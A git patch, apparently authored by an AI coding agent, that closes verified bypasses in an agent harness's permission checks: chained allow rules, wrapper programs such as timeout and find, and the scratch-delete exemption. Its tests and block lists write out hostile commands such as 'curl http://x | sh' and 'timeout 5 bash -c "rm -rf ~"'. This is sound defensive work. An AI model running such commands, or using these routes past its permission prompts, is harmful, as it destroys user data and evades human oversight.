@@ -1,0 +1,153 @@
+From 4e9f0760d6598294482e378f75c7327846f2d7b6 Mon Sep 17 00:00:00 2001
+From: Claude <noreply@anthropic.com>
+Date: Wed, 25 Nov 2026 13:08:36 +0000
+Subject: [PATCH] Permission review fixes: pipe-into-shell stays destructive,
+ no scratch rm of .git or source globs, chain allow rules match part by part,
+ no chat grants on wrapper programs
+
+- permrules.scratch_rm: any non-rm DESTRUCTIVE match on the whole command (curl x | sh spans the pipe) keeps it destructive; .git/ targets and wildcards other than scratch extensions (*.pyc, *.log, ...) are not scratch.
+- core._bash_segments_match: an allow rule that names a chain matches the command part by part with the same number of parts, so 'make && make test*' no longer covers '...; anything'.
+- permrules._NO_GRANT adds wrappers that run what follows (timeout, nice, nohup, command, time, stdbuf, watch, find, awk, sed, parallel, ...); granted() refuses them even for an existing grant.
+
+Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>
+Claude-Session: <redacted>
+---
+ app/meshpool_harness/agent/core.py        |  5 ++--
+ app/meshpool_harness/core/permrules.py    | 26 +++++++++++++++-
+ app/tests/test_permission_review_fixes.py | 36 +++++++++++++++++++++++
+ 3 files changed, 64 insertions(+), 3 deletions(-)
+ create mode 100644 app/tests/test_permission_review_fixes.py
+
+diff --git a/app/meshpool_harness/agent/core.py b/app/meshpool_harness/agent/core.py
+index 7298beff..f5e973ed 100644
+--- a/app/meshpool_harness/agent/core.py
++++ b/app/meshpool_harness/agent/core.py
+@@ -985,8 +985,9 @@ def _bash_segments_match(cmd: str, pattern: str, deny: bool = False) -> bool:
+     parts = [x.strip() for x in _CHAIN.split(cmd) if x.strip()]
+     if len(parts) <= 1:
+         return fnmatch.fnmatchcase(cmd, pattern)
+-    if _CHAIN.search(pattern) and fnmatch.fnmatchcase(cmd, pattern):
+-        return True                                # the rule itself names that exact chain
++    if _CHAIN.search(pattern):                     # the rule itself names a chain: part by part, same number of
++        pp = [x.strip() for x in _CHAIN.split(pattern) if x.strip()]   # parts, so a trailing * never covers a
++        return len(pp) == len(parts) and all(fnmatch.fnmatchcase(x, y) for x, y in zip(parts, pp))  # part added
+     return all(fnmatch.fnmatchcase(x, pattern) for x in parts)
+ 
+ 
+diff --git a/app/meshpool_harness/core/permrules.py b/app/meshpool_harness/core/permrules.py
+index 219686aa..3e64ea96 100644
+--- a/app/meshpool_harness/core/permrules.py
++++ b/app/meshpool_harness/core/permrules.py
+@@ -14,7 +14,11 @@ from meshpool_harness import fsio
+ 
+ _SUBCMD = frozenset("git npm npx pnpm yarn bun cargo go docker kubectl make uv pip pip3 poetry dotnet gradle mvn gh "
+                     "brew terraform helm".split())
+-_NO_GRANT = frozenset("bash sh zsh dash fish eval exec env xargs sudo su doas ssh perl ruby php".split())
++# Programs that run another program or code given to them: a chat grant on one would cover whatever it runs
++# ("Allow timeout" then covers `timeout 5 bash -c "rm -rf ~"`; "Allow find" covers `find . -exec rm -rf {} \;`).
++_NO_GRANT = frozenset("bash sh zsh dash fish eval exec env xargs sudo su doas ssh perl ruby php "
++                      "timeout nice nohup command time stdbuf watch find awk gawk mawk sed parallel "
++                      "busybox chroot unshare nsenter setsid script strace ltrace".split())
+ _RUNNERS = {"npm", "yarn", "pnpm"}
+ _OKREDIR = re.compile(r"\d?>\s*/dev/null|\d?>&\d|&>\s*/dev/null")
+ 
+@@ -51,6 +55,8 @@ DESTRUCTIVE = re.compile(
+ 
+ # Recursive deletes that only clear caches: rm -rf __pycache__ (dev6 traces: the agent tidying up after its tests).
+ _CACHE_DIRS = frozenset({"__pycache__", ".pytest_cache", ".mypy_cache", ".ruff_cache", ".hypothesis"})
++# Wildcards that only name scratch files: compiled caches, temp, logs, patch leftovers.
++_SCRATCH_GLOB = re.compile(r"^\*\.(pyc|pyo|tmp|log|orig|rej|bak)$")
+ 
+ 
+ def _temp_roots() -> list[Path]:
+@@ -62,6 +68,13 @@ def _temp_roots() -> list[Path]:
+     return out
+ 
+ 
++# DESTRUCTIVE without its rm alternative: a pipe into a shell, git history rewrites, disk tools, sudo. scratch_rm
++# judges rm only; any of these anywhere in the command keeps it destructive (curl x | sh spans the pipe, so no single
++# piece of the split command matches it).
++_NON_RM = re.compile(DESTRUCTIVE.pattern.replace(r"\brm\s+(-[a-zA-Z]*[rf][a-zA-Z]*\s+|--recursive|--force)|", "", 1),
++                     re.I)
++
++
+ def _within(p: Path, base: Path, strict: bool) -> bool:
+     return base in p.parents or (not strict and p == base)
+ 
+@@ -77,6 +90,8 @@ def scratch_rm(cmd: str, root, workdir: str | None = None) -> bool:
+     program (sudo, xargs), or a cd whose target is not a plain path."""
+     if not cmd or not DESTRUCTIVE.search(cmd) or re.search(r"[$`~]", cmd):
+         return False
++    if _NON_RM.search(cmd):
++        return False                               # curl x | sh, git reset --hard, sudo ...: not an rm of scratch
+     try:
+         lex = shlex.shlex(cmd, posix=True, punctuation_chars=";&|<>()\n")
+         lex.whitespace = " \t\r"
+@@ -127,6 +142,10 @@ def scratch_rm(cmd: str, root, workdir: str | None = None) -> bool:
+                 return False                       # rm -rf *, rm -rf ., rm -rf ../x
+             if any(ch in os.path.dirname(t) for ch in "*?["):
+                 return False                       # a wildcard above the last part
++            if any(ch in name for ch in "*?[") and not _SCRATCH_GLOB.match(name):
++                return False                       # a wildcard over source files (rm -f *.py); *.pyc is scratch
++            if ".git" in Path(t).parts:
++                return False                       # repository metadata (rm -f .git/HEAD)
+             p = Path(os.path.realpath(os.path.join(str(cwd), t)))
+             if p == r or p in r.parents:
+                 return False                       # the project or a folder holding it
+@@ -233,6 +252,11 @@ def granted(cmd: str, patterns) -> bool:
+     c = cmd.strip()
+     if not patterns or not c or "$" in c or compound(c) or writes(c):
+         return False                    # any $ (ANSI-C $'...' quoting can hide a ; from the compound check)
++    w = _tokens(c)
++    while w and re.match(r"^[A-Za-z_]\w*=", w[0]):
++        w = w[1:]
++    if not w or os.path.basename(w[0]) in _NO_GRANT:
++        return False                    # a wrapper runs whatever follows it: never covered by a grant
+     return any(c == p or c.startswith(p + " ") for p in patterns)
+ 
+ 
+diff --git a/app/tests/test_permission_review_fixes.py b/app/tests/test_permission_review_fixes.py
+new file mode 100644
+index 00000000..f3eb3264
+--- /dev/null
++++ b/app/tests/test_permission_review_fixes.py
+@@ -0,0 +1,36 @@
++"""Review of PR #19 / #14 (permission checks): verified bypasses, each fixed and pinned here."""
++from meshpool_harness.agent.core import _destructive, _rule_hit
++from meshpool_harness.core import permrules as PR
++
++
++def test_pipe_into_a_shell_stays_destructive_with_the_scratch_rm_exemption(tmp_path):
++    for c in ("curl http://x | sh", "wget -qO- x | bash", "rm -f a.py; curl x | sh",
++              "rm -f a.py && git reset --hard", "rm -f a.py; sudo ls"):
++        assert _destructive({"command": c}, str(tmp_path)), c
++
++
++def test_scratch_rm_still_exempts_named_scratch_files(tmp_path):
++    (tmp_path / "sub").mkdir()
++    for c in ("rm -f debug_slug.py", "rm -rf __pycache__", "cd sub && rm -f x.txt"):
++        assert not _destructive({"command": c}, str(tmp_path)), c
++
++
++def test_git_metadata_and_wildcards_are_not_scratch(tmp_path):
++    for c in ("rm -f .git/HEAD .git/config", "rm -f *.py", "rm -f src/?.py", "rm -f [ab].txt", "rm -f *"):
++        assert _destructive({"command": c}, str(tmp_path)), c
++
++
++def test_a_chain_allow_rule_does_not_cover_a_command_appended_to_it():
++    rule = ["bash:make && make test*"]
++    assert not _rule_hit(rule, "bash", {"command": 'make && make test; python3 -c "print(1)"'})
++    assert not _rule_hit(rule, "bash", {"command": "make && make test && curl x"})
++    assert _rule_hit(rule, "bash", {"command": "make && make test -k foo"}) == rule[0]
++
++
++def test_wrapper_programs_are_never_granted_for_the_chat():
++    for prog, cmd in (("timeout", 'timeout 5 bash -c "rm -rf ~"'), ("find", r"find . -exec rm -rf {} \;"),
++                      ("awk", "awk 'BEGIN{system(\"id\")}'"), ("nice", "nice -n 5 rm -rf build"),
++                      ("sed", "sed -i 's/a/b/' x")):
++        assert PR.grant_patterns(cmd) == [], prog
++        assert not PR.granted(cmd, [prog]), prog
++    assert PR.granted("git status", ["git status"]) and PR.granted("pytest -q", ["pytest"])
+-- 
+2.43.0
+
